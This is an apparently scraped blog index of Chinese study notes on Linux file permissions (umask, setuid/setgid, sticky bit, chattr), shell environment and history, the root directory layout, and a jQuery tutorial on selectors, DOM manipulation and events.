普通用户默认创建文件权限是666，而掩码设置为002,则减去掩码，默认创建文件权限为664 root默认创建文件夹权限是777,而掩码设置为022,则要减去掩码，默认创建文件夹权限则变成755 root默认创建文件权限是666，而掩码设置为022,则减去掩码，默认创建文件权限为644 默认权限与掩码进行异或, 得出真实创建文件或文件夹的权限 影响创建文件或文件夹的默认权限 修改只是临时，只影响当前进程 umask 查看当前权限掩码 0777 111 111 111 异或 0002 000 000 010 111 111 101 异或： 相同为0, 不同为1 umask 0077 修改当前权限掩码 ------------------------------------------------------------- 特权位针对命令文件，设定setuid、setgid命令文件设定setuid、setgid没加特权位之前，命令运行的时候所采用的身份是运行者的身份添加了特权位之后，命令运行的时候采用的身份不再是运行者的身份，而是命令本身的所属者例：passwd 文件 ls -al /usr/bin/passwd 针对目录设定setgid 设定了组的特权位后，在该文件夹下创建子文件或子目录，它们自动继承文件夹的所属组的身份,子目录会继承目录的特权位 chmod u+s/g+s file 给file设置特权位 chmod u-s/g-s file 给file取消特权位 例: tom用户指定mary可以在tom目录下创建文件 adduser tom adduser mary mkdir /test/{tom,mary} -p sudo chown tom:tom /test/tom -R sudo chown mary:mary /test/mary -R sudo chmod 700 /test/{tom,mary} -R sudo cp /usr/bin/touch /test/mary/tomCreate sudo chown tom:tom /test/mary/tomCreate sudo chmod 755 /test/mary/tomCreate sudo chmod u+s /test/mary/tomCreate su - mary /test/mary/tomCreate /test/tom/mary.file su - su - tom -rw-rw-r-- 1 tom mary 0 12月 9 21:40 mary.file 查看新创建的文件的所有者和所属组是谁,会看到所属组为mary 针对目录的特权位 只能对目录设置组特权, 任何用户在此目录创建文件的所属用户组为目录的所属用户组(root用户也不行) 组特权为只能管理到他的下面一级， 更里面的文件夹不能管理到 ------------------------------------------------------------- 粘贴位(sticky)防止其它用户删除文件，针对其它用户，管理员和本人可以删除，针对目录有效，文件没有用 chmod o+t dirs 给dirs目录设置粘贴位 例： cd / ls -l查看tmp目录具有的权限 创建文件/tmp/uplooking.txt chmod 777 /tmp/uplooking.txt su - tom rm /tmp/uplooking.txt 看是否可以？ exit sudo chmod o-t /tmp su - tom rm /tmp/uplooking.txt 看是否可以？ sudo chmod o+t /tmp 想想中间的原理是什么？ 两个特殊权限都是在x位上，为了区分权限，如果在某一位有x权限，对应的特殊权限就是小写的， 如果没有x权限，对应的特殊权限就是大写的，sS, tT chmod u-x tmp/ ll tmp -d drwSrwxrwt. 16 root root 4096 12月 9 21:55 tmp ------------------------------------------------------------- 基本权限只能表示三类权限，如果对权限的需求超过三种，那么基本权限就无法满足需要了， 这个时候可以使用扩展的权限，请参考拓展部分内容。 ------------------------------------------------------------- 文件特殊属性 lsattr 查看文件特殊属性 chattr 添加或修改文件特殊属性 sudo chattr +i file 添加i属性，管理员也不得更改 sudo chattr +a file 只能追加内容，不得修改内容，如果有i属性，先取消i,a属性才有用 sudo chattr -i/-a file 取消文件特殊属性 例: touch /tmp/uplooking.txt chmod 777 /tmp/uplooking.txt sudo chattr +i /tmp/uplooking vim /tmp/uplooking 看各种保存是否能成功（&gt;, &gt;&gt;） sudo chattr +a /tmp/uplooking 看是否能成功？ sudo chattr -i /tmp/uplooking sudo chattr +a /tmp/uplooking 看是否能成功？ vim /tmp/uplooking 编辑文件，各种保存看是否能成功, 且文件中并没有提示这是一个只读文件 echo &quot;hello world&quot; &gt;&gt; /tmp/uplooking 看是否能成功 PPP10 -&gt; PPP16 =============================================================================== 三、环境变量、命令别名与命令历史env显示当前shell定义的环境变量，包括当前用户的环境变量 set显示当前shell定义的私有变量，包括用户环境变量,按变量名称排序 export显示当前导出成用户变量shell变量，并显示变量的属性，按变量名称排序 用户环境变量相关配置文件 路径：/home/用户名/ 或 /root/ .bash_history 用户退出登录之后记录之前的历史命令，logout后才会把当前命令历史添加到此文件 .bash_logout 用户退出登录时执行的代码，前提是logout退出或su切换用户用exit或logout才会生效 .bash_profile 用户的环境变量常规设定的地方,用户登录时执行 .bashrc 命令别名的设定地方，打开终端时执行 全局环境变量相关配置文件 /etc/bashrc 和上述一样，只不过这是全局，所有用户都影响 /etc/profile source /etc/profile 立即生效对/etc/profile文件的修改 . /etc/profile 功能同上 命令历史 history 查看当前用户的历史命令 !! 重复执行上一条命令 !a 重复执行上一条以a为首的命令 !100 重复执行第100条命令 !$ 获取上一条命令的参数，多用于获取路径 history 10 显示最后10条命令历史 history -w b.history 把当前命令历史写到b.history文件中 history -r a.history 把a.history的命令读到命令历史列表中 history -c 清除命令历史 命令别名 alias 列出目前所有的别名设置 alias ls='ls -l' 创建ls -l的别名为ls, 只在本shell生效，而且重启终端即失效 unalias ls 释放ls -l的别名 echo &quot;set -o vi&quot; &gt;&gt; ~/.bashrc 用命令别名去快速的挂载和取消挂载 alias ms='sudo mount 192.168.0.183:/ /guazai' alias ums='sudo umount /guazai' . ~/.bashrc 永久生效就把alias创建加入到~/.bashrc里即可 bash快捷键 tab 一次补完命令行或文件名，二次可以列出所有匹配的选择 ctrl+c 结束当前的任务 ctrl+a 跳到行首","link":"/2020/08/03/linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"},{"title":"linux根下目录文件介绍","text":"目录下的文件夹里面分别是以下内容： 12345678910111213141516171819202122232425262728293031/usr 包含所有的命令和程序库、文档和其他文件及当前linux发行版的主要应用程序/var 包含正在操作的文件，还有记录文件、加密文件、临时文件等/home 除了root用户外的所有用户的配置文件，个性化文件和主目录，即家目录/proc 虚拟目录，该目录实际上指向内存而不是硬盘/bin 系统执行文件（二进制文件）普通用户可以使用/sbin 系统执行文件（二进制文件）不能被普通用户使用，通常由root用户使用/etc 操作系统的配置文件/root root用户的家目录/dev 系统设备文件，linux所有设备都是以文件的形式被处理，该目录不包含驱动程序/lib 程序和核心模块共享库（仅限于/下的程序）/boot 系统引导、启动文件，通常grub也在这里/opt 可选应用程序目录/tmp 临时文件，系统会自动清理/lost+found 恢复文件（类似回收站）/media 所有的磁盘（有时有光盘）将以文件夹的形式挂载，光盘镜像也可以挂载/cd-rom 挂载光盘的地方 usr目录下的文件比较重要，其作用下面分类列出： 1234567891011/usr/X11 X-windows桌面环境/usr/doc linux系统的文档资料/usr/share 独立于当前计算机的数据结构，如字典中的词/usr/bin 类似/bin但是不参与启动，大部分命令都在这里/usr/local 本地管理员安装的应用程序/usr/local/bin 用户安装的应用程序（部分） proc目录的内容 1234567891011/proc/cpuinfo 处理器的信息/proc/devices 当前运行内核的所有设备清单/proc/dma 当前正在使用中的DMA通道/proc/filesystem 当前运行内核所配置的文件系统/proc/interrupts 当前使用的中断和曾经有多少个中断/proc/ioports 正在使用的I/O端口","link":"/2020/08/04/linux%E4%B8%8B%E7%9A%84%E7%9B%AE%E5%BD%95%E4%BB%8B%E7%BB%8D/"},{"title":"JQuery基础","text":"一、jQuery基础12345在jQuery库中封装了大量可以直接通过选择器调用的方法或函数，使我们仅使用简单的几行代码就可以实现比较复杂的功能。列如: 可以使用$('#id')来替代JavaScript代码中的document.getElementById()函数，即通过id来获取元素。使用$('tagName')代替JavaScript代码中的document.getElementsByTagName()函数，即通过标签名称获取HTML元素等。jQuery选择器支持CSS1、CSS2的全部和CSS3几乎所有的选择器，以及jQuery独创的高级且复杂的选择器，因此有一定CSS经验的开发人员可以很容易的切入到jQuery的学习中来。一般来说，使用CSS选择器时，开发人员需要考虑主流的浏览器是否支持某些浏览器，但在jQuery中，开发人员则可以放心地使用jQuery选择器，无需考虑浏览器是否支持这些选择器，这极大的方便了开发者。 1、 jQuery语法和选择器1，语法123456789101112131415161718192021222324252627282930313233343536373839404142通过 jQuery，您可以选取（查询，query） HTML 元素，并对它们执行&quot;操作&quot;（actions）。jQuery 语法jQuery 语法是通过选取 HTML 元素，并对选取的元素执行某些操作。基础语法： $(selector).action()美元符号定义 jQuery选择符（selector）&quot;查询&quot;和&quot;查找&quot; HTML 元素jQuery 的 action() 执行对元素的操作实例:$(this).hide() - 隐藏当前元素$(&quot;p&quot;).hide() - 隐藏所有 &lt;p&gt; 元素$(&quot;p.test&quot;).hide() - 隐藏所有 class=&quot;test&quot; 的 &lt;p&gt; 元素$(&quot;#test&quot;).hide() - 隐藏 id=&quot;test&quot; 的元素您也许已经注意到在我们的实例中的所有 jQuery 函数位于一个 document ready 函数中：$(document).ready(function(){ // 开始写 jQuery 代码... });这是为了防止文档在完全加载（就绪）之前运行 jQuery 代码，即在 DOM 加载完成后才可以对 DOM 进行操作。如果在文档没有完全加载之前就运行函数，操作可能失败。下面是两个具体的例子：试图隐藏一个不存在的元素获得未完全加载的图像的大小提示：简洁写法（与以上写法效果相同）:$(function(){ // 开始写 jQuery 代码... });以上两种方式你可以选择你喜欢的方式实现文档就绪后执行 jQuery 方法。 2，选择器 语法 描述 实例 $(“*”) 选取所有元素 在线实例 $(this) 选取当前 HTML 元素 在线实例 $(“p.intro”) 选取 class 为 intro 的 元素 在线实例 $(“p:first”) 选取第一个 元素 在线实例 $(“ul li:first”) 选取第一个 元素的第一个 元素 在线实例 $(“ul li:first-child”) 选取每个 元素的第一个 元素 在线实例 $(“[href]”) 选取带有 href 属性的元素 在线实例 $(“a[target=’_blank’]”) 选取所有 target 属性值等于 “_blank” 的 元素 在线实例 $(“a[target!=’_blank’]”) 选取所有 target 属性值不等于 “_blank” 的 元素 在线实例 $(“:button”) 选取所有 type=”button” 的 元素 和 元素 在线实例 $(“tr:even”) 选取偶数位置的 元素 在线实例 $(“tr:odd”) 选取奇数位置的 元素 1，基本选择器12345678910111213141516171819202122232425262728id选择器 元素选择器 类名选择器 复合选择器 通配符选择器1，id选择器 id选择器#id就是利用DOM元素的id属性值来选择匹配的元素，并以jQuery包装集的形式返回给对象 使用公式: $(&quot;#id&quot;) 示例: $(&quot;#box&quot;)//获取id属性值为box的元素2，元素选择器是根据元素名称匹配响应的元素，元素选择器指向的是DOM元素的标签名，也就是说元素选择器是根据元素的标记名选择的 使用公式: $(&quot;element&quot;) 示例: $(&quot;div&quot;) //获取所有div元素3，类名选择器 类名选择器是通过元素拥有的CSS类的名称查找匹配的DOM元素，在一个页面中，一个元素可以有多个CSS类，一个CSS类又可以匹配多个元素，如果有元素中有一个匹配的类的名称就可以被类名选择器选取到。 使用公式: $(&quot;.class&quot;) 示例: $(&quot;.box&quot;) //获取class属性值为box的所有元素 4，复合选择器 使用公式: $(&quot;selector1,selector2,....,selectorN&quot;) 复合选择器将多个选择器(可以使id选择器、元素选择器或是类名选择器)组合在一起，两个选择器之间以逗号&quot;,&quot;分隔，只要符合其中的任何一个诗选条件就会被匹配，返回的是一个集合形式的JQuery包装集，利用jQuery索引器可以取得集合中的jQuery对象 注意: 多种匹配条件的选择器并不是匹配同事满足这几个条件的元素，而是将每个选择器匹配的元素合并后一起返回。 selector1:一个有效的选择器，可以使id选择器，元素选择器或是类名选择器等 selector2: 另一个有效的选择器，可以是ID选择器，元素选择器或是类名选择器等 selectorN: (可选择)任意多个选择器，可以是ID选择器，元素选择器或是类名选择器等 示例: $(&quot;div,#btn&quot;)//要查询文档中的全部的&lt;div&gt;元素和id属性为btn的元素 5，通配符选择器 $(&quot;*&quot;) //取得页面上所有的DOM元素集合的jQuery包装集 2,层次选择器123456789101112131415161718192021222324252627281、ancestor descendant选择器 ancestor descendant选择器中的ancestor代表祖先，descendant代表子孙，用于在给定的祖先元素下匹配所有的后代元素。 使用公式: $(&quot;ancestor descendant&quot;) ancestor是指任何有效的选择器 descendand是用以匹配元素的选择器，并且它是ancestor所指定元素的后代元素 示例: $(&quot;ul li&quot;) //匹配ul元素下面的全部li元素 2、parent&gt; child选择器 parent&gt;child选择器中的parent代表父元素，child代表子元素，用于在给定的父元素下匹配所有的子元素，使用该选择器只能选择父元素的直接子元素。 使用公式: $(&quot;parent&gt;child&quot;) parent是指任何有效的选择器 child是用以匹配元素的选择器，并且它是parent元素的子元素 示例: $(&quot;form&gt;input&quot;) //匹配表单中所有的子元素input 3、prev + next选择器 prev + next 选择器用于匹配所有紧接在prev元素后的next元素，其中，prev和next是两个相同级别的元素。 使用公式: $(&quot;prev + next&quot;) prev是指任何有效的选择器 next是一个有效的选择器并紧接着prev选择器 示例: $(&quot;div + img&quot;) //匹配&lt;div&gt;标记后的&lt;img&gt;标记 4、prev ~ siblings选择器 prev ~ siblings选择器用于匹配prev元素之后的所有siblings元素，其中，prev和sibling是一个相同的辈元素。 使用公式: $(&quot;prev~siblings&quot;) prev是指任何有效的选择器 siblings是一个有效选择器并紧接着prev选择器 示例: $(&quot;div~ul&quot;) //匹配div元素后面的同辈所有ul元素 3,过滤选择器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861、简单过滤器简单过滤器是指以冒号开头，通常用于实现简单过滤效果的过滤器。:first 说明: 匹配找到的第一个元素，他是与选择器结合使用的 示例: $(&quot;tr:first&quot;)//匹配表格的第一行:last 说明: 匹配找到的最后一个元素，它是与选择器结合使用的 示例: $(&quot;tr:last&quot;) //匹配表格的最后一行:even 说明: 匹配所有索引值为偶数的元素，索引值从0开始计数 示例: $(&quot;tr:even&quot;) //匹配索引为偶数的行:odd 说明: 匹配所有索引值为奇数的元素，索引值从0开始计数 示例: $(&quot;tr:odd&quot;) //匹配索引为奇数的行:eq(index) 说明: 匹配一个给定索引值的元素 示例: $(&quot;div:eq(1)&quot;) //匹配第二个div元素:gt(index) 说明: 匹配所有大于给定索引值的元素 示例: $(&quot;span:gt(0)&quot;) //匹配索引大于0的span元素(注意:大于0，而不包括0):lt(index) 说明: 匹配所有小于给定索引值的元素 示例: $(&quot;span:gt(2)&quot;) //匹配索引小于2的span元素(注意:小于2，而不包括2):header 说明: 匹配如ht,h2,h3....之类的标题元素 示例: $(&quot;:header&quot;)//匹配全部的标题元素:not(selector) 说明: 去除所有与给定选择器匹配的元素 示例: $(&quot;input:not(:checked)&quot;)//匹配没有被选中的input元素:animated 说明: 匹配所有正在执行动画效果的元素 示例: $(&quot;div:animated&quot;) //匹配正在执行动画的div元素2、内容过滤器内容过滤器就是通过DOM元素包含的文本内容以及是否含有匹配的元素进行选择。:contains(text) 说明: 匹配所有不包含子元素或者文本的空元素 示例: $(&quot;li:contains(&quot;word&quot;)&quot;) //匹配含有&quot;word&quot;文本内容的li元素:empty 说明: 匹配所有不包含子元素或者文本的空元素 示例: $(&quot;td:empty&quot;) //匹配不包含子元素或者文本的单元格:has(selector) 说明: 匹配含有选择器所有元素的元素 示例: $(&quot;td:has(p)&quot;) //匹配表格的单元格中含有&lt;p&gt;标签的单元格:parent 说明: 匹配含有子元素或文本的元素 示例: $(&quot;td:parent&quot;)//匹配不为空的单元格，即在该单元格中还包括子元素或者文本3、可见性过滤器元素可见状态有两种，分别是隐藏状态和显示状态。可见性过滤器就是利用可见的元素进行选中:visible 说明: 匹配所有可见元素:hidden 说明: 匹配所有不可见元素 注意: 在应用:hidden过滤器时，display属性是none以及input元素的type属性为hiden 4、表单对象的属性过滤器表单对象的属性过滤器通过表单元素的状态属性(例如选中，不选中)来进行过滤:checked 说明:匹配所有选中的被选中元素 示例:$(&quot;input:checked&quot;)//匹配所有被选中的input元素:disabled 说明: 匹配所有不可用的元素 示例: $(&quot;input:disabled&quot;) //匹配所有不可用的input元素:enabled 说明: 匹配所有可用的元素 示例: $(&quot;input:enabled&quot;) //匹配所有可用的input元素:selected 说明: 匹配所有选中的option元素 示例: $(&quot;select option:selected&quot;) //匹配所有被选中的选项元素5、子元素过滤器子元素选择器就是选择给定某个元素的子元素，具体的过滤条件由选择器的子元素选择:first-child 说明: 匹配所有给定元素的第一个子元素 示例: $(&quot;ul li:first-child&quot;) //匹配ul元素中的第一个子元素li:last-child 说明: 匹配所有给定元素的最后一个子元素 示例:$(&quot;ul li:last-child&quot;) //匹配ul元素中的最后一个子元素li:only-child 说明: 如果 某个元素是它父元素中的唯一元素，那么将会匹配， 示例: $(&quot;ul li:only-child&quot;) //匹配只含有一个li元素的ul元素中的li:nth-child(index/even/odd/equation) 说明: 匹配每个父元素下的第一个index个子或奇偶元素 示例: $(&quot;ul li:nth-child(even)&quot;)//匹配ul中索引值为偶数的子元素li $(&quot;ul li:nth-child(3)&quot;) //匹配ul中第3个li元素 4，属性选择器12345678910111213141516171819202122属性选择器就是通过元素的属性作为过滤条件进行选择对象。[attribute] 说明: 匹配包含给定属性的元素 示例: $(&quot;div[name]&quot;) //匹配含有name属性的div元素[attribute=value] 说明: 匹配属性值为value的元素 示例: $(&quot;div[name='test']&quot;) //匹配name属性是test的div元素[attribute!=value] 说明: 匹配属性值不等于value的元素 示例: $(&quot;div[name!='test']&quot;) //匹配name属性不是test的div元素[attribute*=value] 说明: 匹配属性含有value的元素 示例: $(&quot;div[name*='test']&quot;) //匹配name属性中含有test值div元素[attribute^=value] 说明: 匹配属性值以value开始的元素 示例: $(&quot;div[name^='test']&quot;) //匹配name属性以test开头的div元素[attribute$=value] 说明: 匹配属性值是以value结束的元素 示例: $(&quot;div[name$='test']&quot;) //匹配name属性以test结束的div元素[selector1][selector2][selectorN] 说明: 复合属性选择器，需要同时满足多个条件是使用 示例: $(&quot;div[id][name^='test']&quot;) //匹配具有id属性并有name属性且属性值以test开头的div元素 5,表单选择器1234567891011121314151617181920212223242526272829303132333435363738表单选择器是匹配经常在表单内出现的元素，但是匹配的元素不一定在表单中。:input 说明: 匹配所有的input元素 示例: $(&quot;:input&quot;) //匹配所有的input元素 $(&quot;form :input&quot;) //匹配&lt;form&gt;标记中的所有input元素，需要注意，在form和:之间有一个空格:button 说明:匹配所有的普通按钮，即type=&quot;button&quot;的input元素 示例: $(&quot;:button&quot;) //匹配所有的普通按钮:checkbox 说明: 匹配所有的复选框 示例: $(&quot;:checkbox&quot;) //匹配所有的复选框:file 说明: 匹配所有的文件域 示例: $(&quot;:file&quot;) //匹配所有的文件域:hidden 说明: 匹配所有的不可见元素，或者type为hidden的元素 示例: $(&quot;:hidden&quot;)//匹配所有的隐藏域:image 说明:匹配所有的图像域 示例: $(&quot;:image&quot;) //匹配所有的图像域:password 说明:匹配所有的密码域 示例: $(&quot;passwoed&quot;) //匹配所有的密码域:radio 说明:匹配所有的单选按钮 示例: $(&quot;:radio&quot;)//匹配所有的单选按钮:reset 说明: 匹配所有的重置按钮，即type=&quot;reset&quot;的input元素 示例: $(&quot;:reset&quot;) //匹配所有的重置按钮:submit 说明:匹配所有的提交按钮，即type=&quot;submmit&quot;的input元素 示例: $(&quot;:submit&quot;)//匹配所有的提交按钮:text 说明:匹配所有的单行文本框 示例: $(&quot;:text&quot;) //匹配所有的单行文本框 var $jqObj= $(&quot;form :checkbox&quot;)$jqObj.attr(&quot;checked&quot;,&quot;checked&quot;) //attr可以设置属性值 6,选择器中的注意事项12345选择器中含有特殊符号的注意事项含有&quot;.&quot;、&quot;#&quot;、&quot;(&quot;或&quot;]&quot;等特殊字符。选择器中含有空格的注意事项在实际应用当中，选择器中含有空格也是不容忽视的，多一个空格或者少一个空格也会得到截然不同的结果 2，jQuery 遍历函数三个最基本的过滤方法是：first(), last() 和 eq()，它们允许您基于其在一组元素中的位置来选择一个特定的元素。 jQuery 遍历函数包括了用于筛选、查找和串联元素的方法。 函数 描述 .add() 将元素添加到匹配元素的集合中。 .andSelf() 把堆栈中之前的元素集添加到当前集合中。 .children() 获得匹配元素集合中每个元素的所有子元素。 .closest() 从元素本身开始，逐级向上级元素匹配，并返回最先匹配的祖先元素。 .contents() 获得匹配元素集合中每个元素的子元素，包括文本和注释节点。 .each() 对 jQuery 对象进行迭代，为每个匹配元素执行函数。 .end() 结束当前链中最近的一次筛选操作，并将匹配元素集合返回到前一次的状态。 .eq() 将匹配元素集合缩减为位于指定索引的新元素。 .filter() 将匹配元素集合缩减为匹配选择器或匹配函数返回值的新元素。 .find() 获得当前匹配元素集合中每个元素的后代，由选择器进行筛选。 .first() 将匹配元素集合缩减为集合中的第一个元素。 .has() 将匹配元素集合缩减为包含特定元素的后代的集合。 .is() 根据选择器检查当前匹配元素集合，如果存在至少一个匹配元素，则返回 true。 .last() 将匹配元素集合缩减为集合中的最后一个元素。 .map() 把当前匹配集合中的每个元素传递给函数，产生包含返回值的新 jQuery 对象。 .next() 获得匹配元素集合中每个元素紧邻的同辈元素。 .nextAll() 获得匹配元素集合中每个元素之后的所有同辈元素，由选择器进行筛选（可选）。 .nextUntil() 获得每个元素之后所有的同辈元素，直到遇到匹配选择器的元素为止。 .not() 从匹配元素集合中删除元素。 .offsetParent() 获得用于定位的第一个父元素。 .parent() 获得当前匹配元素集合中每个元素的父元素，由选择器筛选（可选）。 .parents() 获得当前匹配元素集合中每个元素的祖先元素，由选择器筛选（可选）。 .parentsUntil() 获得当前匹配元素集合中每个元素的祖先元素，直到遇到匹配选择器的元素为止。 .prev() 获得匹配元素集合中每个元素紧邻的前一个同辈元素，由选择器筛选（可选）。 .prevAll() 获得匹配元素集合中每个元素之前的所有同辈元素，由选择器进行筛选（可选）。 .prevUntil() 获得每个元素之前所有的同辈元素，直到遇到匹配选择器的元素为止。 .siblings() 获得匹配元素集合中所有元素的同辈元素，由选择器筛选（可选）。 .slice() 将匹配元素集合缩减为指定范围的子集。 :even 匹配所有索引值为偶数的元素， :odd 匹配所有索引值为奇数的行， 3，jQuery对元素内容的操作123&lt;div&gt; &lt;p&gt;yichen is a good man&lt;/p&gt;&lt;/div&gt; 元素的内容是指定义元素的起始标记和结束标记之间的内容，可以分为文本内容和HTML内容 文本内容: div元素的文本内容为”yichen is a good man “,文本内容不包含元素的子元素，值包含元素的文本内容 HTML内容:div元素的HTML内容为”yichen is a good man “,HTML内容不仅包含元素的文本内容，而且还包含元素的子元素 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647481、操作文本内容 &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;p&gt;yichin is a good man &lt;/p&gt; &lt;/div&gt; &lt;div &gt; yichei &lt;/div&gt; &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;input&quot; value=&quot;yichen is a good man&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ /*text() ：用于获取全部匹配元素的文本内容 注意：也可以解析XML文档元素的文本内容 text(val):用于设置全部匹配的元素的文本内容 注意:元素原来的内容将被新设置的内容替换掉，包括HTML内容 注意:设置文本内容时，即使内容包含HTML代码，也将被认为是普通文本， 并不能作为HTML代码被浏览器解析 */ $div= $(&quot;div&quot;) // $div.text(&quot;yichen is a nice man&quot;) $div.text(&quot;&lt;h1&gt;yichen is a nice man&lt;/h1&gt;&quot;)//纯文本内容，不会解析成HTML代码 //获取文本内容 console.log($div.text()); //设置文本内容 $div.text(&quot;&lt;span&gt;我是通过text()设置的文本内容&lt;/span&gt;&quot;); //html():用于获取第一个匹配元素的HTML内容 //html(val):用于设置全部匹配的html 内容 //注意：内容中包含HTML代码可以被浏览器解析 console.log($div.html()); $div.html(&quot;&lt;span&gt;我是通过html()设置的文本内容&lt;/span&gt;&quot;); console.log($div.html()); //$div.html(&quot;&lt;h1&gt;yichen is a nice man&lt;/h1&gt;&quot;)//这种可以解析 //对元素值的操作 $input=$(&quot;#input&quot;) //设置值 $input.val(&quot;nice man &quot;) console.log($input.val()) }) &lt;/script&gt; 4,jQuery对DOM节点操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132元素节点 文本节点 属性节点&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;jQ对dom的操作&lt;/title&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/style.css&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box1&quot;&gt; &lt;p&gt;yichen is a good man&lt;/p&gt; &lt;p&gt;yichen is a nice man&lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;box2&quot;&gt; &lt;p&gt;yichen is a good man&lt;/p&gt; &lt;p&gt;yichen is a nice man&lt;/p&gt; &lt;p &gt;yichen is a handsome man&lt;/p&gt; &lt;p&gt;yichen is a cool man&lt;/p&gt; &lt;button type=&quot;button&quot;id=&quot;btn&quot; &gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;script&gt; $(document).ready(function(){ //元素节点 创建p节点 var $jsp = $(&quot;&lt;p&gt;&lt;/p&gt;&quot;) console.log($jsp) $(&quot;div&quot;).append($jsp) console.log($jsp) //文本节点 var $jsp2 = $(&quot;&lt;p&gt;yichen is a good man&lt;/p&gt;&quot;); $(&quot;div&quot;).append($jsp2) console.log($jsp2) //属性节点 var $jsp3 = $(&quot;&lt;p title='nice'&gt;yichen is a good man&lt;/p&gt;&quot;); $(&quot;div&quot;).append($jsp3) console.log($jsp3) console.log($(&quot;div&quot;)) /* append(content) 为所有匹配的元素的内部追加内容 appendTo(content) 将所有匹配的元素添加到另一个元素集合中 prepend(content) prependTo(content) */ /*after(content):在每个匹配的元素的之后插入内容 insertAfter(content) before(content) insertBefore(content) */ var $box1 = $(&quot;#box1&quot;) //$box1.after($jsp2) $jsp2.insertAfter($box1) //删除节点 /*remove() 用于从DOM中删除匹配的元素 detach() //不会把匹配的元素从jQuery对象中删除 ，因此，在将来仍然可以使用这些匹配的元素，与remove() 不同的是，所有绑定的时间或附加数据都会保留下来 empty() 该方法并不是删除节点，而是将节点清空，该方法可以 清空元素中所有的后代节点 */ // var $p1 = $(&quot;div p:first&quot;).remove() //var $p1 = $(&quot;div p:first&quot;).detach() //复制节点 $(&quot;#box1 p:eq(1)&quot;).bind(&quot;click&quot;,function(){ //true把事件也复制，可以一直复制 $(this).clone(true).insertAfter($(this)) }) //替换节点 /* replaceAll(seletor) replaceWith(content) */ // $(&quot;#box1&quot;).replaceWith(&quot;&lt;div&gt;yichne&lt;/div&gt;&quot;) // $(&quot;&lt;div&gt;good&lt;/div&gt;&quot;).replaceAll(&quot;div&quot;) //遍历节点 $(&quot;p&quot;).each(function(index){ $(this).attr(&quot;title&quot;,&quot;我是第&quot;+ (index+1)+&quot;个p标签&quot; ) }) /* addClass(class) :为所有匹配的元素添加指定的CSS类名 removeClass(class) :从所有匹配的元素中删除全部或者指定的css类 toggleClass(class):如果存在就删除一个css类，如果不存在就在添加一个css类 toggleClass(class. switch): 如果switch参数为true 则加上对应的CSS类，否则就删除 注意: 使用addClass()方法添加css类时，并不会删除现有的css类，同事，在使用以上方法时，其class参数都可以设置多个类名 。类名与类名之间用空格分开 */ $(&quot;div&quot;).addClass(&quot;change1&quot;); $(&quot;div&quot;).removeClass(&quot;change1&quot;); // 修改css样式属性 $(&quot;#btn&quot;).bind(&quot;click&quot;,function(){ $(&quot;#box2&quot;).css(&quot;background-color&quot;,&quot;yellow&quot;) //获取属性值 console.log($(&quot;#box2&quot;).css(&quot;backgroundColor&quot;)) }) //text html attr 修改标签的属性 css addClass removeClass }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 二，jQuery提升1，jquery事件模块事件方法触发器或添加一个函数到被选元素的事件处理程序。 下面的表格列出了所有用于处理事件的 jQuery 方法。 方法 描述 bind() 向元素添加事件处理程序 blur() 添加/触发失去焦点事件 change() 添加/触发 change 事件 click() 添加/触发 click 事件 dblclick() 添加/触发 double click 事件 delegate() 向匹配元素的当前或未来的子元素添加处理程序 die() 在版本 1.9 中被移除。移除所有通过 live() 方法添加的事件处理程序 error() 在版本 1.8 中被废弃。添加/触发 error 事件 event.currentTarget 在事件冒泡阶段内的当前 DOM 元素 event.data 包含当前执行的处理程序被绑定时传递到事件方法的可选数据 event.delegateTarget 返回当前调用的 jQuery 事件处理程序所添加的元素 event.isDefaultPrevented() 返回指定的 event 对象上是否调用了 event.preventDefault() event.isImmediatePropagationStopped() 返回指定的 event 对象上是否调用了 event.stopImmediatePropagation() event.isPropagationStopped() 返回指定的 event 对象上是否调用了 event.stopPropagation() event.namespace 返回当事件被触发时指定的命名空间 event.pageX 返回相对于文档左边缘的鼠标位置 event.pageY 返回相对于文档上边缘的鼠标位置 event.preventDefault() 阻止事件的默认行为 event.relatedTarget 返回当鼠标移动时哪个元素进入或退出 event.result 包含由被指定事件触发的事件处理程序返回的最后一个值 event.stopImmediatePropagation() 阻止其他事件处理程序被调用 event.stopPropagation() 阻止事件向上冒泡到 DOM 树，阻止任何父处理程序被事件通知 event.target 返回哪个 DOM 元素触发事件 event.timeStamp 返回从 1970 年 1 月 1 日到事件被触发时的毫秒数 event.type 返回哪种事件类型被触发 event.which 返回指定事件上哪个键盘键或鼠标按钮被按下 event.metaKey 事件触发时 META 键是否被按下 focus() 添加/触发 focus 事件 focusin() 添加事件处理程序到 focusin 事件 focusout() 添加事件处理程序到 focusout 事件 hover() 添加两个事件处理程序到 hover 事件 keydown() 添加/触发 keydown 事件 keypress() 添加/触发 keypress 事件 keyup() 添加/触发 keyup 事件 live() 在版本 1.9 中被移除。添加一个或多个事件处理程序到当前或未来的被选元素 load() 在版本 1.8 中被废弃。添加一个事件处理程序到 load 事件 mousedown() 添加/触发 mousedown 事件 mouseenter() 添加/触发 mouseenter 事件 mouseleave() 添加/触发 mouseleave 事件 mousemove() 添加/触发 mousemove 事件 mouseout() 添加/触发 mouseout 事件 mouseover() 添加/触发 mouseover 事件 mouseup() 添加/触发 mouseup 事件 off() 移除通过 on() 方法添加的事件处理程序 on() 向元素添加事件处理程序 one() 向被选元素添加一个或多个事件处理程序。该处理程序只能被每个元素触发一次 $.proxy() 